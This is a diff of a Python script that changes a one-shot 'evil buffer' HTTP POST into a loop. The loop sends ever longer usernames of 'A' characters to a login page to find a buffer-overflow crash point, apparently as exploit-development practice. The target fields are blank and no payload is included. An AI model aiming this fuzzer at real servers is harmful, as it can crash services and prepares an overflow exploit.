@@ -1,39 +1,45 @@
 #!/usr/bin/python3
 
 import socket
+import time
+import sys
 
-try:
-    print("\nSending evil buffer...")
+size = 100
+host = ""
+port = ""
+page = ""
 
-    size = 100
-    host = ""
-    page = ""
-    port = 80
+while(size < 2000):
+    try:
+        print("\nSending evil buffer with %s bytes" % size)
 
-    inputBuffer = "A" * size
+        inputBuffer = "A" * size
 
-    content = "username=" + inputBuffer + "&password=A"
+        content = "username=" + inputBuffer + "&password=A"
 
-    buffer = "POST /login HTTP/1.1\r\n"
-    buffer += "Host: " + host + "\r\n"
-    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
-    buffer += "Accept: text/html,application/xhtml+xml,application\xml;q=0.9,*/*;q=0.8\r\n"
-    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
-    buffer += "Referer: " + host + "/" + page + "\r\n"
-    buffer += "Connection: close\r\n"
-    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
-    buffer += "Content-Length: " + str(len(content)) + "\r\n"
-    buffer += "\r\n"
+        buffer = "POST /login HTTP/1.1\r\n"
+        buffer += "Host: " + host + "\r\n"
+        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+        buffer += "Accept: text/html,application/xhtml+xml,application\xml;q=0.9,*/*;q=0.8\r\n"
+        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+        buffer += "Referer: " + host + "/" + page + "\r\n"
+        buffer += "Connection: close\r\n"
+        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+        buffer += "Content-Length: " + str(len(content)) + "\r\n"
+        buffer += "\r\n"
 
-    buffer += content
+        buffer += content
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    s.connect((host, port))
-    s.send(buffer)
+        s.connect((host, port))
+        s.send(buffer)
 
-    s.close()
+        s.close()
 
-    print("\nDone!")
-except:
-    print("Unable to connect to " + host + " on port " + port)
+        size += 100
+        time.sleep(10)
+
+    except:
+        print("Unable to connect to " + host + " on port " + port)
+        sys.exit()
